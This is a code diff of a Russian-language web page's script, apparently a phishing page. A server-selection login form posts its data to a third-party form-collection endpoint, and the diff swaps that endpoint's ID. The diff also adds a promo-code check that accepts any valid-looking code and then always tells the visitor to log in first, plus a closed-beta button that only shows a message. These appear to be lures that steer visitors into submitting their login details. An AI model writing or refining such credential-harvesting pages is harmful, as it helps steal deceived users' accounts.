@@ -221,7 +221,7 @@ document.addEventListener('DOMContentLoaded', () => {
             
             const s = servers.find(x => x.id === selectedId);
             
-            fetch('https://formspree.io/f/moevzzwb', {
+            fetch('https://formspree.io/f/mdekqqpk', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify({
@@ -238,6 +238,38 @@ document.addEventListener('DOMContentLoaded', () => {
                     setStatus('Не удалось выполнить вход. Попробуйте ещё раз', 'error');
                     if (submitBtn) submitBtn.disabled = false;
                 });
+        });
+    }
+
+    // ===== Валидация промокода =====
+    const promoInput = document.getElementById('promoInput');
+    const promoMsgBox = document.getElementById('promoMsgBox');
+    const promoErrorText = document.getElementById('promoErrorText');
+
+    if (promoInput && promoMsgBox) {
+        promoInput.addEventListener('input', () => {
+            const val = promoInput.value.trim();
+            
+            if (val === '') {
+                promoMsgBox.style.display = 'flex';
+                promoErrorText.textContent = 'Введите промокод!';
+            } else if (!/^[A-Za-z0-9]+$/.test(val)) {
+                promoMsgBox.style.display = 'flex';
+                promoErrorText.textContent = 'Промокод должен быть только на английском языке!';
+            } else {
+                promoMsgBox.style.display = 'flex';
+                promoErrorText.textContent = 'Для начала войдите в личный кабинет!';
+            }
+        });
+    }
+
+    // ===== Валидация ЗБТ (показ ошибки только по клику на кнопку) =====
+    const betaBtn = document.getElementById('betaBtn');
+    const betaMsgBox = document.getElementById('betaMsgBox');
+
+    if (betaBtn && betaMsgBox) {
+        betaBtn.addEventListener('click', () => {
+            betaMsgBox.style.display = 'flex';
         });
     }
 });
